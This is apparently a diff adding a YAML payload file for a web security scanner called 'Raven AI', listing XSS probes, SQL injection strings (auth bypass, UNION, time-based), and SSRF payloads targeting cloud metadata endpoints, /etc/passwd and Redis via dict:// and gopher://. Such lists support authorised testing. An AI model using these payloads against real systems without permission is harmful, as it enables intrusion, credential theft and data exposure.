@@ -1,0 +1,41 @@
+# Raven AI - Centralized Payload Configuration
+# Format: YAML Structured Lists
+
+xss:
+  payloads:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "javascript:alert(1)"
+    - "\"><script>alert(1)</script>"
+    - "'><script>alert(1)</script>"
+    - "<svg/onload=alert(1)>"
+    - "<details/open/ontoggle=alert(1)>"
+    - "<video><source onerror=\"alert(1)\">"
+    - "'-alert(1)-'"
+    - "\";alert(1)//"
+
+sqli:
+  payloads:
+    - "'"
+    - "\""
+    - "') OR '1'='1"
+    - "\" OR \"1\"=\"1"
+    - "' OR 1=1--"
+    - "\" OR 1=1--"
+    - "admin'--"
+    - "' UNION SELECT NULL,NULL--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "') OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+
+ssrf:
+  payloads:
+    - "http://127.0.0.1"
+    - "http://localhost"
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://instance-data"
+    - "http://metadata.google.internal"
+    - "http://[::]:80/"
+    - "http://0.0.0.0"
+    - "file:///etc/passwd"
+    - "dict://127.0.0.1:6379/SET:test:test"
+    - "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aconfig%0d%0a*4%0d%0a$3%0d%0aget%0d%0a$3%0d%0adir%0d%0a"
